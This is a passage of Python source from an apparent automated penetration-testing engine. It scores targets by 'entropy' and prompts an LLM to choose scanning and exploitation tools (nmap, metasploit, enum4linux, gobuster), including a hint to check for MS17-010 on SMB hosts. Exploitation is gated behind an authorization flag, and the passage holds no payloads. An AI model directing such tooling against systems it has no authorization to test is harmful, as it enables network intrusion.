            f"  port {s.get('port')}/{s.get('service','?')}"
            + (f"  [{banner}]" if banner else "")
        )
    svc_block = "\n".join(svc_lines) if svc_lines else "  (none discovered yet — nmap has not run)"

    # Realized wickets
    realized = sorted(w for w, s in states.items()
                      if (s.get("status") if isinstance(s, dict) else s) == "realized")
    blocked  = sorted(w for w, s in states.items()
                      if (s.get("status") if isinstance(s, dict) else s) == "blocked")
    unknown  = sorted(w for w in (t.get("applicable_wickets") or set())
                      if (states.get(w, {}).get("status") if isinstance(states.get(w, {}), dict)
                          else str(states.get(w, ""))) not in ("realized", "blocked"))[:20]

    # Folds
    fold_manager = t.get("fold_manager")
    fold_lines = []
    if fold_manager:
        for f in sorted(fold_manager.all(), key=lambda x: -x.gravity_weight())[:5]:
            fold_lines.append(f"  [{f.fold_type}] p={f.discovery_probability:.2f}  {f.detail[:80]}")
    fold_block = "\n".join(fold_lines) or "  (none)"

    # Dark hypotheses from wicket graph
    dark = t.get("wgraph_dark", [])
    dark_lines = [f"  {d['wicket_id']} τ={d['torque']:.2f} [{d['domain']}] {d.get('label','')}"
                  for d in dark[:4]]
    dark_block = "\n".join(dark_lines) or "  (none)"

    # Available instruments with descriptions (only coherent candidates)
    cand_names = {name for _, name, _ in candidates}
    instr_lines = []
    for pot, name, inst in candidates[:16]:
        already_run = bool(glob.glob(str(DISCOVERY_DIR / f"gravity_{name.split('_')[0]}_{ip}_*.ndjson"))
                           or glob.glob(str(DISCOVERY_DIR / f"gravity_{name}_{ip.replace('.','_')}_*.ndjson")))
        run_flag = " [already run this session]" if already_run else ""
        instr_lines.append(
            f"  {name:20s}  E-potential={pot:5.1f}  {inst.description[:55]}{run_flag}"
        )
    instr_block = "\n".join(instr_lines)

    # OS / target class
    os_hint = target_dict.get("os") or target_dict.get("kind") or "unknown"
    domains  = ", ".join(sorted(t.get("domains") or []))
    E        = t.get("entropy", 0.0)
    n_unknown = len(unknown)
    n_realized = len(realized)
    tool_block = _observed_tool_summary(t.get("view_state") or {})

    # Recent analyst output (if AI already ran)
    analyst_ctx = ""
    analyst_files = sorted(glob.glob(str(DISCOVERY_DIR / f"gravity_analyst_{ip.replace('.','_')}_*.ndjson")))
    if analyst_files:
        try:
            last_ev = json.loads(Path(analyst_files[-1]).read_text().splitlines()[0])
            analysis = last_ev.get("payload", {}).get("detail", "")[:300]
            if analysis:
                analyst_ctx = f"\nAI ANALYST PRIOR OUTPUT:\n{analysis}\n"
        except Exception:
            pass

    from skg.resonance.llm_pool import AnthropicLLMBackend
    _is_claude = isinstance(_structured_backend, AnthropicLLMBackend)
    auth_note = "authorization granted" if authorized else "exploitation requires --authorized"

    all_known_instruments = {name for _, name, _ in candidates}

    if _is_claude:
        # Claude handles long-context structured prompts reliably — ask for JSON
        prompt = (
            f"You are directing a security engagement using the SKG gravity field engine.\n\n"
            f"TARGET: {ip}  OS: {os_hint}  Domains: {domains or 'none yet'}\n"
            f"Field entropy: {E:.1f}  ({n_unknown} unknown wickets, {n_realized} realized)\n\n"
            f"OPEN SERVICES:\n{svc_block}\n\n"
            f"OBSERVED NODE-LOCAL TOOLS:\n  {tool_block}\n\n"
            f"CONFIRMED wickets: {', '.join(realized[:15]) or 'none'}\n"
            f"TOP UNKNOWN: {', '.join(unknown[:12]) or 'none'}\n\n"
            f"FOLDS (structural gaps):\n{fold_block}\n\n"
            f"DARK HYPOTHESES:\n{dark_block}\n"
            f"{analyst_ctx}\n"
            f"{auth_note}\n\n"
            f"AVAILABLE INSTRUMENTS (gravity-ranked):\n{instr_block}\n\n"
            f"Select 2-{max_instruments} instruments to run concurrently. Rules:\n"
            f"- No services yet: always include nmap\n"
            f"- SMB (139/445): metasploit (smb aux scan), enum4linux\n"
            f"- Web (80/443/8080): gobuster, nikto if available, http_collector or auth_scanner\n"
            f"- SSH: ssh_sensor; databases: db_discovery\n"
            f"- Skip [already run] unless new evidence justifies it\n"
            f"- Without --authorized: auxiliary/scanner modules only\n"
            f"- Prefer breadth first, depth after services mapped\n\n"
            f'Return ONLY valid JSON:\n{{"instruments": ["name1", "name2"], "rationale": "one sentence"}}'
        )
    else:
        # Short prompt for small Ollama models — focused context, list output
        svc_short = "; ".join(
            f"port {s.get('port')}/{s.get('service','?')}"
            + (f"[{s.get('banner','')}]" if s.get('banner') else "")
            for s in services[:6]
        ) or "none yet"
        instr_short = ", ".join(n for _, n, _ in candidates[:12])
        smb_hint = "SMB found: check MS17-010. " if any(s.get('port') in (139, 445) for s in services) else ""
        web_hint = "Web found: enumerate directories. " if any(s.get('port') in (80, 443, 8080, 8443) for s in services) else ""
        ssh_hint = "SSH found: collect host state. " if any(s.get('port') == 22 for s in services) else ""
        no_svc_hint = "No services yet: run nmap first. " if not services else ""
        # Force immediate list output by pre-filling "Run:" at the end
        # Small models (TinyLlama) complete the suffix rather than generating preamble
        prompt = (
            f"Engagement target {ip}. Services: {svc_short}.\n"
            f"Observed node-local tools: {tool_block}.\n"
            f"Instruments available: {instr_short}.\n"
            f"{smb_hint}{web_hint}{ssh_hint}{no_svc_hint}"
            f"Run:"
        )

    try:
        response = _structured_backend.generate(prompt, num_predict=256, temperature=0.15)
        response = response.strip()
    except Exception as exc:
        log.debug(f"[LLM-SELECT] LLM call failed for {ip}: {exc}")
        return None

    selected_names: list[str] = []
    rationale = ""

    # ── Parse response — try JSON first, then fuzzy name extraction ──────
    # Clean markdown fences
    _clean = response
    if "```" in _clean:
        _clean = re.sub(r"```[a-z]*\n?", "", _clean).replace("```", "").strip()

    # Try JSON extraction — look for any JSON object in the response
    _json_match = re.search(r'\{[^{}]*"instruments"[^{}]*\}', _clean, re.DOTALL)
    if not _json_match:
        # Broader: any JSON-ish object
        _json_match = re.search(r'\{.*?\}', _clean, re.DOTALL)

    if _json_match:
        try:
            _parsed = json.loads(_json_match.group(0))
            selected_names = _parsed.get("instruments") or []
            rationale = _parsed.get("rationale", "")
        except Exception:
            pass

    # Fuzzy fallback: scan for known instrument names anywhere in the text
    # Works when small models write "I recommend running nmap and gobuster"
    if not selected_names:
        for name in all_known_instruments:
            # Match whole word, allow underscores/hyphens
            if re.search(r'(?<![a-z])' + re.escape(name) + r'(?![a-z_])', response, re.IGNORECASE):
                selected_names.append(name)
        # Deduplicate, preserve mention order
        seen_f = set()
        selected_names = [n for n in selected_names if not (n in seen_f or seen_f.add(n))]
        if selected_names:
            rationale = "(extracted from freetext response)"

    if not selected_names:
        log.debug(f"[LLM-SELECT] could not extract instrument names for {ip}: {response[:200]}")
        return None

    if not selected_names or not isinstance(selected_names, list):
        return None

    # Build result: map LLM choices back to candidate tuples, preserving order
    cand_map = {name: (pot, name, inst) for pot, name, inst in candidates}
    chosen = []
    seen = set()
    for name in selected_names:
        name = name.strip().lower().replace("-", "_")
        if name in cand_map and name not in seen:
            chosen.append(cand_map[name])
            seen.add(name)

    # If LLM picked nothing valid, fall back
    if not chosen:
        log.debug(f"[LLM-SELECT] no valid selections for {ip} from: {selected_names}")
        return None

    print(f"\n  [LLM-SELECT] {ip}: Ollama selected {len(chosen)} instruments")
    if rationale:
        print(f"    → {rationale}")
    print(f"    → {', '.join(n for _, n, _ in chosen)}")
    return chosen


# ── The Field ────────────────────────────────────────────────────────────

def gravity_field_cycle(surface_path: str, out_dir: str,
                        cycle_num: int, instruments: dict,
                        authorized: bool = False,
                        focus_target: str | None = None) -> dict:
    """
    One cycle of the gravity field dynamics.

    Not observe-orient-decide-act. Continuous field dynamics:
    1. Run FoldDetector — structural/contextual/temporal/projection gaps
    2. Compute entropy landscape across all targets (E = unknowns + fold_weight)
    3. Follow the gradient — highest entropy region
    4. Select instrument that maximizes entropy reduction potential
    5. If that instrument previously failed here, shift to next best
    6. Execute and measure entropy change
    7. The changed entropy reshapes the landscape for next cycle

    Folds add to E because they represent structural uncertainty —
    dark regions of state space the system knows it cannot yet evaluate.
    A target with 10 unknown wickets and a structural fold for redis (p=0.85)
    has E ≈ 11.85, not E = 10.
    """
    surface = _hydrate_surface_from_latest_nmap(surface_path)
    if not surface:
        surface = json.loads(Path(surface_path).read_text())
    surface = _merge_configured_targets(surface)
    view_state_by_identity = _load_fresh_view_state()
    subject_rows = _gravity_subject_rows(surface, view_state_by_identity, focus_target=focus_target)
    if focus_target:
        if not subject_rows:
            print(f"  [TARGET] {focus_target} not present in measured surface or target shell")
            return {
                "cycle": cycle_num,
                "actions_taken": 0,
                "entropy_reduced": 0.0,
                "total_entropy": 0.0,
                "total_unknowns": 0,
                "total_folds": 0,
                "fold_boost": 0.0,
            }
    out_path = Path(out_dir)
    out_path.mkdir(parents=True, exist_ok=True)
    run_id = str(uuid.uuid4())
    reporter = GravityFailureReporter(run_id=run_id, cycle_num=cycle_num, logger=log)

    # ── Prune stale pending proposals ──────────────────────────────────────
    # Keep only the newest pending proposal per (ip, port) + all non-pending.
    proposals_dir = SKG_STATE_DIR / "proposals"
    if proposals_dir.exists():
        try:
            by_target: dict = {}
            all_props = []
            for f in proposals_dir.glob("*.json"):
                try:
                    p = json.loads(f.read_text())
                    p["_file"] = f
                    all_props.append(p)
                except Exception:
                    pass
            for p in all_props:
                if p.get("status","pending") != "pending":
                    continue
                act = p.get("action",{})
                key = f"{act.get('target_ip','')}:{act.get('port','')}"
                ts  = p.get("created_at","") or p.get("ts","") or ""
                if key not in by_target or ts > by_target[key].get("ts",""):
                    by_target[key] = p
            newest_ids = {p["id"] for p in by_target.values()}
            pruned = 0
            for p in all_props:
                if p.get("status","pending") == "pending" and p["id"] not in newest_ids:
                    p["_file"].unlink(missing_ok=True)
                    pruned += 1
            if pruned > 0:
                print(f"  [PROPOSALS] Pruned {pruned} stale pending (kept newest per target)")
        except Exception as exc:
            reporter.emit(
                "proposal_prune",
                "failed to prune stale pending proposals",
                exc=exc,
            )

    domain_wickets = load_all_wicket_ids()
    _zero_day_domain_wickets = domain_wickets  # reference for zero-day engine
    all_wickets = set()
    for wids in domain_wickets.values():
        all_wickets.update(wids)

    _cycle_wall_start = time.monotonic()
    # Total wall budget for instrument execution within this cycle.
    # Pre-instrument work (fold detection, topology, proposals) uses ~30s;
    # this leaves the remainder for actual scanning.
    _CYCLE_INSTRUMENT_BUDGET = 240.0  # seconds per cycle

    print(f"\n{'='*70}")
    print(f"  GRAVITY FIELD — CYCLE {cycle_num}")
    print(f"  {iso_now()}")
    print(f"{'='*70}")
    if focus_target and subject_rows:
        _subject = subject_rows[0]
        _t = _subject.get("target") or {}
        _view = _subject.get("view_state") or {}
        _svcs = ", ".join(
            f"{s.get('port')}/{s.get('service')}" for s in _t.get("services", [])[:12]
        ) or "unknown"
        _domains = ", ".join(_view.get("measured_domains") or _t.get("domains", [])) or "none"
        _tools = _observed_tool_summary(_view)
        _cls = _t.get("kind") or _t.get("os") or "unknown"
        print(f"  [TARGET] {focus_target}  class={_cls}")
        print(f"  [SERVICES] {_svcs}")
        print(f"  [DOMAINS ] {_domains}")
        if _tools != "none":
            print(f"  [TOOLS   ] {_tools}")

    # ── Run FoldDetector ─────────────────────────────────────────────────────
    # Build per-IP fold map before entropy calculation so folds
    # are included in E for each target.
    fold_manager_by_identity: dict[str, object] = _load_persisted_fold_managers(Path(out_dir) / "folds")
    try:
        from skg.kernel.folds import FoldDetector, FoldManager
        detector = FoldDetector()
        all_new_folds = detector.detect_all(
            events_dir=DISCOVERY_DIR,   # gravity events live here
            cve_dir=CVE_DIR,
            toolchain_dir=SKG_HOME,
        )
        # Group folds by identity key so measured manifestations and shell metadata
        # attach to the same subject even when locations differ.
        for fold in all_new_folds:
            identity_key = _fold_identity_key(fold)
            if identity_key:
                if identity_key not in fold_manager_by_identity:
                    fold_manager_by_identity[identity_key] = FoldManager()
                fold_manager_by_identity[identity_key].add(fold)

        # Report fold summary
        total_folds = sum(
            len(fm.all()) for fm in fold_manager_by_identity.values()
        )
        if total_folds > 0:
            print(f"\n  [FOLDS] {total_folds} active folds detected:")
            fold_counts: dict[str, int] = {}
            for fm in fold_manager_by_identity.values():
                for f in fm.all():
                    fold_counts[f.fold_type] = fold_counts.get(f.fold_type, 0) + 1
            for ft, count in sorted(fold_counts.items()):
                print(f"    {ft:14s}: {count}")
            print(f"    {'resolve via':14s}: skg folds list")
        else:
            print(f"\n  [FOLDS] No folds detected this cycle")

    except Exception as exc:
        reporter.emit("fold_detector", f"FoldDetector unavailable: {exc}", exc=exc)
        fold_manager_by_identity = {}

    try:
        created_toolchain_proposals = _create_toolchain_proposals_from_folds(
            fold_manager_by_identity, surface_path
        )
        if created_toolchain_proposals:
            print(f"\n  [FORGE] {len(created_toolchain_proposals)} toolchain proposal(s) created from folds:")
            for _pid in created_toolchain_proposals[:6]:
                print(f"    {_pid}  → skg proposals show {_pid[:8]}")
    except Exception as exc:
        reporter.emit("fold_to_forge", f"Fold→forge pipeline unavailable: {exc}", exc=exc)

    try:
        created_catalog_growth = _create_catalog_growth_proposals_from_folds(
            fold_manager_by_identity
        )
        if created_catalog_growth:
            print(f"\n  [FORGE] {len(created_catalog_growth)} catalog growth proposal(s) created from folds:")
            for _pid in created_catalog_growth[:6]:
                print(f"    {_pid}  → skg proposals show {_pid[:8]}")
    except Exception as exc:
        reporter.emit("fold_to_catalog_growth", f"Fold→catalog growth pipeline unavailable: {exc}", exc=exc)

    # ── Compute field pull context ─────────────────────────────────────────
    sphere_pulls: dict[str, float] = {}
    sphere_persistence: dict[str, float] = {}
    fiber_clusters_by_anchor: dict[str, object] = {}
    try:
        from skg.topology.energy import compute_field_fibers, compute_field_topology

        field_topology = compute_field_topology(DISCOVERY_DIR, INTERP_DIR)
        sphere_pulls = {
            sphere: float(field.gravity_pull or 0.0)
            for sphere, field in field_topology.spheres.items()
        }
        sphere_persistence = {
            sphere: float(getattr(field, "pearl_persistence", 0.0) or 0.0)
            for sphere, field in field_topology.spheres.items()
        }
        for cluster in compute_field_fibers():
            fiber_clusters_by_anchor[getattr(cluster, "anchor", "")] = cluster
    except Exception as exc:
        reporter.emit("field_topology", f"Topology pull unavailable: {exc}", exc=exc)
        sphere_pulls = {}
        sphere_persistence = {}
        fiber_clusters_by_anchor = {}

    # ── Expire stale pending proposals (older than 4 hours) ──────────────────
    # Prevents MSF dedup from blocking on proposals that were never actioned.
    _proposals_dir = SKG_STATE_DIR / "proposals"
    if _proposals_dir.exists():
        _now_ts = datetime.now(timezone.utc)
        for _pf in _proposals_dir.glob("*.json"):
            try:
                _pd = json.loads(_pf.read_text())
                if _pd.get("status") != "pending":
                    continue
                _age_s = (_now_ts - datetime.fromisoformat(
                    _pd.get("generated_at","1970-01-01T00:00:00+00:00")
                )).total_seconds()
                if _age_s > 14400:  # 4 hours
                    _pd["status"] = "expired"
                    _pf.write_text(json.dumps(_pd, indent=2))
            except Exception:
                pass

    # ── Prune old event files (older than 30 days) ─────────────────────────
    # Prevents temporal fold accumulation from stale observations.
    # CVE feed files are retained longer (90 days) since they represent
    # NVD state, not per-target sensor observations.
    try:
        _event_cutoff = datetime.now(timezone.utc) - timedelta(days=30)
        _cve_cutoff   = datetime.now(timezone.utc) - timedelta(days=90)
        _pruned_events = 0
        for _ef in EVENTS_DIR.glob("*.ndjson"):
            try:
                _mtime = datetime.fromtimestamp(_ef.stat().st_mtime, tz=timezone.utc)
                _cutoff = _cve_cutoff if _ef.name.startswith("cve_") else _event_cutoff
                if _mtime < _cutoff:
                    _ef.unlink(missing_ok=True)
                    _pruned_events += 1
            except Exception:
                pass
        if _pruned_events > 0:
            print(f"  [CLEANUP] Pruned {_pruned_events} stale event file(s) (>30 days old)")
    except Exception as _pe:
        log.debug(f"[cleanup] event pruning failed: {_pe}")

    # ── Compute entropy landscape ──
    print("\n  [FIELD] Computing entropy landscape...\n")

    landscape = []
    for subject in subject_rows:
        identity_key = subject["identity_key"]
        ip = subject["ip"]
        target = dict(subject.get("target") or {})
        view_state = dict(subject.get("view_state") or summarize_view_nodes([], identity_key=identity_key))
        states = load_wicket_states(identity_key)

        # Mirror state to SQLite for fast queries
        if _state_db is not None:
            try:
                _state_db.bulk_upsert_wickets(identity_key, states)
            except Exception:
                pass

        # Determine applicable wickets from observed domains and service hints.
        effective_domains = derive_effective_domains(
            target,
            ip=ip,
            discovery_dir=DISCOVERY_DIR,
            view_state=view_state,
        )
        applicable = applicable_wickets_for_domains(effective_domains, domain_wickets)

        # ── Wicket graph: domain expansion + phase sync ───────────────────────
        # The wicket graph runs Kuramoto dynamics on the semantic space.
        # High-torque unknown wickets signal which domains have unresolved
        # information pressure — even if not in the target's surface domains.
        _wgraph_boosts: dict = {}
        _wgraph_inst_boosts: dict = {}   # {instrument_name: boost}
        _wgraph_dark: list = []          # dark hypotheses → fold entries
        if _wgraph is not None:
            try:
                _wgraph.sync_phases(states)
                # Collapse all currently-realized wickets to propagate phase
                for _wid, _ws in states.items():
                    if isinstance(_ws, dict) and _ws.get("status") == "realized":
                        _wgraph.collapse(_wid, "realized", steps=3)
                # Domain expansion signal: high-torque wickets in other domains
                _new_domains = _wgraph.domains_signaled(effective_domains)
                if _new_domains:
                    effective_domains = effective_domains | _new_domains
                    applicable = applicable_wickets_for_domains(effective_domains, domain_wickets)
                # Phase gradient → raw wicket torques (for E contribution)
                _wgraph_boosts = _wgraph.gravity_boosts(top_n=8)
                # Instrument boosts: directly elevate potential for instruments
                # that can confirm high-torque hypotheses
                _avail_insts = set(instruments.keys())
                _wgraph_inst_boosts = _wgraph.instrument_boosts(_avail_insts)
                # Hypothesis classification: dark = high torque, no instrument
                _hyps = _wgraph.hypotheses(
                    available_instruments=_avail_insts, min_torque=0.4)
                _wgraph_dark = [h for h in _hyps if h["is_dark"]]
            except Exception as _wge:
                log.debug(f"[wicket_graph] cycle error for {ip}: {_wge}")

        field_pull_boost = _bounded_field_pull_boost(
            ip=ip,
            effective_domains=effective_domains,
            sphere_pulls=sphere_pulls,
            fiber_clusters_by_anchor=fiber_clusters_by_anchor,
            sphere_persistence=sphere_persistence,
        )

        # Base E: count of unknown catalogued wickets
        E_base = field_entropy(states, applicable, ip=ip)

        # Fold contribution: structural uncertainty on top of unknown nodes
        # Field pull contribution: bounded topology/fiber pressure from the
        # richer field law. This biases routing without replacing kernel E.
        # L_F contribution: unified field functional (Paper 4) — captures coupling
        # energy between domains that E_base misses. Log-scaled to keep it
        # proportional: a target with L_F=1000 gets ~0.7 more pull than L_F=0.
        # E = E_base + Σ fold.gravity_weight() + bounded field pull + γ·log1p(L_F/10)
        fold_manager  = fold_manager_by_identity.get(identity_key)
        fold_boost    = fold_manager.total_gravity_weight() if fold_manager else 0.0
        # Paper 4 L(F) field functional — compute here so L_F_boost can use it
        L_F = 0.0
        try:
            L_F = _kernel.L_field_functional(identity_key)
        except Exception:
            pass
        L_F_boost     = 0.0
        if L_F > 0:
            import math as _math
            L_F_boost = 0.15 * _math.log1p(L_F / 10.0)
        # Wicket graph boost: sum of top-N phase gradient torques, scaled
        # to same order as L_F_boost (max ~1.5 for 8 fully-torqued wickets)
        wgraph_boost  = 0.0
        if _wgraph_boosts:
            import math as _math2
            wgraph_boost = 0.10 * _math2.log1p(sum(_wgraph_boosts.values()))
        E             = E_base + fold_boost + field_pull_boost + L_F_boost + wgraph_boost

        # ── First-contact floor ───────────────────────────────────────────
        # A new target has no services yet so applicable is empty → E=0 → skipped.
        # Any target without a prior nmap scan is maximally uncertain: give it
        # a floor entropy and a broad applicable set so gravity runs nmap on it.
        E, applicable, no_nmap_history = apply_first_contact_floor(
            ip=ip,
            entropy=E,
            applicable=applicable,
            domain_wickets=domain_wickets,
            discovery_dir=DISCOVERY_DIR,
            has_measured_view=bool(int(view_state.get("view_count", 0) or 0)),
        )
        if no_nmap_history:
            target["_no_nmap_history"] = True

        unresolved, realized, blocked = summarize_applicable_states(states, applicable)
        n_folds  = len(fold_manager.all()) if fold_manager else 0

        # ── Kuramoto order parameter R per sphere ─────────────────────────
        # Computes R(sphere) for each domain covered by this target.
        # R ∈ [0,1]: 0 = maximally incoherent (all unknown), 1 = fully synchronized.
        # Used to modulate instrument selection: low R → amplify potential.
        R_per_sphere: dict = {}
        try:
            from skg.topology.energy import field_spheres_for_domains
            from skg.topology.kuramoto import build_oscillators, _order_parameter_per_sphere
            osc = build_oscillators(EVENTS_DIR, INTERP_DIR)
            # Filter to oscillators relevant to this target
            target_osc = [o for o in osc
                          if hasattr(o, 'wicket_id') and any(
                              o.wicket_id in applicable
                          )] if osc else []
            if not target_osc:
                # Fall back to all oscillators with sphere matching the target's domains.
                target_spheres = set(field_spheres_for_domains(sorted(effective_domains)))
                target_osc = [o for o in osc if getattr(o, 'sphere', '') in target_spheres]
            if target_osc:
                R_per_sphere = _order_parameter_per_sphere(target_osc)
        except Exception:
            R_per_sphere = {}

        landscape.append({
            "ip": ip,
            "identity_key":      identity_key,
            "entropy":           E,
            "E_base":            E_base,
            "fold_boost":        fold_boost,
            "field_pull_boost":  field_pull_boost,
            "L_F_boost":         L_F_boost,
            "n_folds":           n_folds,
            "unknowns":          round(unresolved, 4),
            "realized":          realized,
            "blocked":           blocked,
            "total_wickets":     len(applicable),
            "applicable_wickets": applicable,
            "states":            states,
            "domains":           sorted(effective_domains),
            "services":          target.get("services", []),
            "target":            target,
            "view_state":        view_state,
            "fold_manager":      fold_manager,
            "R_per_sphere":      R_per_sphere,   # Kuramoto order parameter
            "L_F":               L_F,             # Paper 4 field functional
            "wgraph_boost":       wgraph_boost,        # Wicket graph phase gradient contribution
            "wgraph_boosts":      _wgraph_boosts,      # {wicket_id: torque} top signals
            "wgraph_inst_boosts": _wgraph_inst_boosts, # {instrument: boost} confirmed hypotheses
            "wgraph_dark":        _wgraph_dark,         # dark hypotheses (no instrument coverage)
        })

    # ── Zero-day detection: generate wickets for uncovered service versions ──
    # For each target in the landscape that has service banners, check if any
    # service version has no catalog coverage. If so, query NVD and generate
    # new wickets on-the-fly. Hot-reload domain_wickets after generation.
    _zd_new_wickets: list[str] = []
    for _zt in landscape:
        _zt_services = _zt.get("target", {}).get("services", []) or []
        _zt_banners = [s for s in _zt_services if s.get("banner")]
        if not _zt_banners:
            continue
        try:
            from skg.sensors.zero_day_detector import run_zero_day_detection as _run_zd
            _zd_result = _run_zd(
                service_list=_zt_banners,
                domain_wickets=domain_wickets,
                target_ip=_zt["ip"],
            )
            if _zd_result.get("new_wickets"):
                _zd_new_wickets.extend(_zd_result["new_wickets"])
        except Exception as _zde:
            log.debug(f"[zero_day] {_zt['ip']}: {_zde}")
    # Hot-reload catalogs if new ones were generated
    if _zd_new_wickets:
        domain_wickets = load_all_wicket_ids()
        print(f"  [ZERO-DAY] {len(_zd_new_wickets)} new wickets loaded: {_zd_new_wickets[:5]}")

    # Sort by entropy — follow the gradient
    landscape.sort(key=lambda x: x["entropy"], reverse=True)

    # Display field — show E breakdown: base unknowns + fold boost
    print(f"  {'IP':18s} {'E':>7s} {'Unr':>7s} {'Folds':>5s} {'Fold+':>6s} {'Field+':>6s} {'Real':>5s} {'Blk':>5s}")
    print(f"  {'-'*18} {'-'*7} {'-'*7} {'-'*5} {'-'*6} {'-'*6} {'-'*5} {'-'*5}")
    for t in landscape:
        fold_str = f"+{t['fold_boost']:.1f}" if t['fold_boost'] > 0 else "     "
        field_str = f"+{t['field_pull_boost']:.1f}" if t['field_pull_boost'] > 0 else "     "
        print(f"  {t['ip']:18s} {t['entropy']:7.2f} "
              f"{t['unknowns']:7.2f} {t['n_folds']:5d} {fold_str:>6s} {field_str:>6s} "
              f"{t['realized']:5d} {t['blocked']:5d}")

        # Print fold details for high-entropy targets
        if t['n_folds'] > 0 and t['fold_manager']:
            for fold in sorted(t['fold_manager'].all(),
                                key=lambda f: -f.gravity_weight())[:3]:
                print(f"    ↳ [{fold.fold_type:12s}] p={fold.discovery_probability:.2f} "
                      f"{fold.detail[:70]}")

    # ── Available instruments ──
    print(f"\n  [INSTRUMENTS]")
    for name, inst in instruments.items():
        status = "ready" if inst.available else "unavailable"
        print(f"    {name:20s} [{status:12s}] {inst.description[:50]}")

    # ── Follow the gradient ──
    print(f"\n  [GRADIENT] Following entropy gradient...\n")

    actions_taken = 0
    entropy_reduced = 0.0
    entropy_increased = 0.0

    for t in landscape:
        if t["entropy"] == 0 and not t["target"].get("_no_nmap_history"):
            continue  # Fully determined — no gravitational pull

        # node_key = stable identity for this node (the scheduling primitive).
        # ip = routable address — used only for network instrument execution and file patterns.
        node_key = str(t.get("identity_key") or t["ip"]).strip()
        ip = t["ip"]
        fold_note  = (f", {t['n_folds']} folds (+{t['fold_boost']:.1f})"
                      if t['n_folds'] > 0 else "")
        field_note = (f", field (+{t['field_pull_boost']:.1f})"
                      if t.get("field_pull_boost", 0.0) > 0 else "")
        lf_note    = (f", L(F) (+{t['L_F_boost']:.2f})"
                      if t.get("L_F_boost", 0.0) > 0 else "")
        wg_note    = (f", K⊗ (+{t['wgraph_boost']:.2f})"
                      if t.get("wgraph_boost", 0.0) > 0.01 else "")
        print(f"  → {node_key} (E={t['entropy']:.2f}, "
              f"{t['unknowns']} unknowns{fold_note}{field_note}{lf_note}{wg_note})")
        # Show top wicket graph signals if any
        wg_boosts = t.get("wgraph_boosts", {})
        if wg_boosts:
            top = sorted(wg_boosts.items(), key=lambda x: -x[1])[:3]
            print(f"    K⊗ signals: {', '.join(f'{w}={v:.2f}' for w, v in top)}")
        # Dark hypotheses — high-torque wickets with no instrument coverage
        # These are structural blindspots: the physics predicts they exist
        # but the instrument set cannot confirm them.
        _dark = t.get("wgraph_dark", [])
        if _dark:
            print(f"    ◈ Dark hypotheses ({len(_dark)}) — field predicts, instruments cannot see:")
            for _dh in _dark[:4]:
                _capable_str = (f"  [capable (unavail): {', '.join(_dh['all_capable'][:2])}]"
                                if _dh["all_capable"] else "  [no instrument exists]")
                print(f"      {_dh['wicket_id']:8s}  τ={_dh['torque']:.2f}  "
                      f"{_dh['domain']:20s}  {_dh['label'] or _dh['wicket_id']}"
                      f"{_capable_str}")

        candidates, cold_start_target = rank_instruments_for_node(
            target_row=t,
            instruments=instruments,
            focus_target=focus_target,
            entropy_reduction_potential=entropy_reduction_potential,
            coherence_fn=_instrument_observation_coherence,
            reinforcement_fn=_pearl_reinforcement_boost,
            has_recent_artifact=_has_recent_artifact,
            discovery_dir=DISCOVERY_DIR,
            cve_dir=CVE_DIR,
            interp_dir=INTERP_DIR,
            print_fn=print,
        )

        if not candidates:
            print(f"    No instruments can reduce entropy here")
            continue

        # ── Gravity-primary selection ─────────────────────────────────────
        # Gravity computes potential scores — that IS the selection mechanism.
        # The LLM reads the gravity context and can augment selection on warm
        # targets (cold start: bootstrap sweep always runs without LLM overhead).
        to_run, serial_item, selected_items = choose_instruments_for_target(
            candidates=candidates,
            instruments=instruments,
            target_row=t,
            cold_start_target=cold_start_target,
            coherence_fn=_instrument_observation_coherence,
            interactive=sys.stdin.isatty(),
            print_fn=print,
        )

        # ── LLM advisory pass (warm targets only) ─────────────────────────
        # After gravity computes the selection, ask the LLM if it agrees.
        # On warm targets the LLM has enough context to be useful; on cold
        # targets the bootstrap sweep runs regardless.  The LLM can reorder
        # or augment from the full candidate set but cannot remove instruments
        # that physics scored above the LLM's suggestions.
        # Falls back to gravity selection if no LLM is available.
        if not cold_start_target and candidates:
            # Run LLM selection in a thread with a 45-second wall-clock budget.
            # If Ollama is slow or unresponsive, fall back to gravity selection.
            import threading as _threading
            _llm_result_box: list = []
            def _llm_worker():
                try:
                    r = _llm_select_instruments(
                        t, candidates, instruments, authorized=authorized, max_instruments=6
                    )
                    _llm_result_box.append(r)
                except Exception:
                    _llm_result_box.append(None)
            _llm_thread = _threading.Thread(target=_llm_worker, daemon=True)
            _llm_thread.start()
            _llm_thread.join(timeout=45.0)
            _llm_selection = _llm_result_box[0] if _llm_result_box else None
            if _llm_thread.is_alive():
                print(f"  [LLM-SELECT] {ip}: Ollama timed out (45s) — using gravity selection")
            if _llm_selection:
                # Merge: keep any gravity-top instruments the LLM didn't include,
                # then append LLM additions from the wider candidate set.
                gravity_names = {n for _, n, _ in to_run}
                llm_names     = {n for _, n, _ in _llm_selection}
                # Instruments in both → keep gravity ordering for them
                merged = list(to_run)
                for item in _llm_selection:
                    if item[1] not in gravity_names:
                        merged.append(item)
                to_run         = merged
                selected_items = list(to_run)
                if serial_item:
                    selected_items.append(serial_item)

        if not selected_items:
            print(f"    No instruments selected")
            continue

        print(f"\n  [EXEC] {ip} — running {len(selected_items)} instruments concurrently:")
        for p, n, _ in selected_items:
            flag = " [serial/interactive]" if n == "metasploit" and serial_item else ""
            print(f"    · {n:22s} (potential={p:.1f}){flag}")

        # Execute concurrently
        E_before = t["entropy"]

        from concurrent.futures import ThreadPoolExecutor, as_completed

        def _run_one(args):
            _potential, _name, _inst = args
            return _name, execute_instrument(_inst, t["target"], run_id, out_path, t["states"], authorized=authorized)

        concurrent_results = {}
        if to_run:
            _elapsed = time.monotonic() - _cycle_wall_start
            _budget_remaining = max(30.0, _CYCLE_INSTRUMENT_BUDGET - _elapsed)
            with ThreadPoolExecutor(max_workers=MAX_CONCURRENT) as pool:
                futures = {pool.submit(_run_one, item): item[1] for item in to_run}
                from concurrent.futures import TimeoutError as _FutureTimeout
                try:
                    for future in as_completed(futures, timeout=_budget_remaining):
                        name, res = future.result()
                        concurrent_results[name] = res
                except _FutureTimeout:
                    for future, name in list(futures.items()):
                        if future.done():
                            try:
                                n, r = future.result(timeout=0)
                                concurrent_results[n] = r
                            except Exception:
                                pass
                        else:
                            future.cancel()
                            concurrent_results[name] = {
                                "instrument": name, "success": False,
                                "error": "cycle budget exceeded",
                            }
                    print(f"  [EXEC] Instrument budget exhausted — remaining instruments cancelled")
        if serial_item:
            _elapsed2 = time.monotonic() - _cycle_wall_start
            if _elapsed2 < _CYCLE_INSTRUMENT_BUDGET:
